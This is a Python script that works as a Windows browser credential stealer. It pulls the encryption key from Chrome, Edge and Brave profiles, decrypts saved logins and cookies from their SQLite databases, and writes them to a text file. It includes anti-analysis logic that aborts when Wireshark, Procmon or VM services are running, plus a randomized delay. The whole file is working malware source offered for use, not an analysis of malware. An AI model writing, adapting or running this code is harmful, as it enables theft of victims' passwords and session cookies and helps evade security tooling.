import os
import json
import base64
import sqlite3
import random
import subprocess
import win32crypt
import time
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from datetime import datetime
from rich.console import Console
from rich.table import Table
from base64 import b64encode

console = Console()

BROWSER_PATHS = {
    "Chrome": os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data"),
    "Edge": os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data"),
    "Brave": os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data"),
}

TARGET_FILES = {
    "cookies": "Network\\Cookies",
    "logins": "Login Data"
}

def random_delay():
    delay = random.uniform(3, 7)
    time.sleep(delay)

def is_sandboxed():
    suspicious = ["wireshark", "procmon", "procexp", "vmsrvc", "vmusrvc"]
    try:
        tasks = subprocess.check_output("tasklist", shell=True).decode().lower()
        for proc in suspicious:
            if proc in tasks:
                return True
    except Exception:
        pass
    return False

def get_master_key(browser_path):
    try:
        with open(os.path.join(browser_path, "Local State"), "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception as e:
        console.print(f"[red][ERRO] {browser_path}: {e}[/red]")
        return None

def decrypt_data(buff, master_key):
    try:
        if buff.startswith(b'v10'):
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
            return cipher.decrypt(payload)[:-16].decode('utf-8')
        return "UNKNOWN_FORMAT"
    except Exception as e:
        return f"DECRYPT_ERROR: {e}"

def get_profiles(browser_path):
    profiles = []
    try:
        for p in os.listdir(browser_path):
            if p.startswith("Profile") or p == "Default":
                profiles.append(p)
    except Exception as e:
        console.print(f"[red][ERRO] Profiles: {e}[/red]")
    return profiles

def dump_credentials(browser, profile, master_key):
    path = os.path.join(BROWSER_PATHS[browser], profile, TARGET_FILES["logins"])
    try:
        src = sqlite3.connect(path)
        dst = sqlite3.connect(":memory:")
        src.backup(dst)
        src.close()
        creds = []
        cursor = dst.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        for url, user, pwd in cursor.fetchall():
            creds.append((url, user or "-", decrypt_data(pwd, master_key)))
        dst.close()
        return creds
    except Exception as e:
        console.print(f"[red][ERRO] Creds Dump: {e}[/red]")
        return []

def dump_cookies(browser, profile, master_key):
    path = os.path.join(BROWSER_PATHS[browser], profile, TARGET_FILES["cookies"])
    try:
        src = sqlite3.connect(path)
        dst = sqlite3.connect(":memory:")
        src.backup(dst)
        src.close()
        cookies = []
        cursor = dst.cursor()
        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
        for host, name, value in cursor.fetchall():
            cookies.append((host, name, decrypt_data(value, master_key)))
        dst.close()
        return cookies
    except Exception as e:
        console.print(f"[red][ERRO] Cookies Dump: {e}[/red]")
        return []

def save_to_file(data, filename):
    try:
        with open(filename, "w") as f:
            f.write(data)
        console.print(f"[green]✔ Dados salvos em {filename}[/green]")
    except Exception as e:
        console.print(f"[red][ERRO] {filename}: {e}[/red]")

def main():
    if is_sandboxed():
        console.print("[red][!] Sandbox detectado! Abortando...[/red]")
        return

    random_delay()

    all_data = ""

    for browser in BROWSER_PATHS:
        if not os.path.exists(BROWSER_PATHS[browser]):
            continue
        master_key = get_master_key(BROWSER_PATHS[browser])
        if not master_key:
            continue
        profiles = get_profiles(BROWSER_PATHS[browser])
        for profile in profiles:
            console.rule(f"Dumping {browser} - {profile}")

            creds = dump_credentials(browser, profile, master_key)
            cookies = dump_cookies(browser, profile, master_key)

            all_data += f"\n\n[{browser} - {profile} - Credenciais]\n"
            for url, user, pwd in creds:
                all_data += f"{url} | {user} | {pwd}\n"

            all_data += f"\n\n[{browser} - {profile} - Cookies]\n"
            for host, name, val in cookies:
                all_data += f"{host} | {name} | {val}\n"

    if all_data.strip():
        filename = "dados_coletados.txt"
        save_to_file(all_data, filename)
    else:
        console.print("[red][!] Nenhum dado encontrado.[/red]")

if __name__ == "__main__":
    main()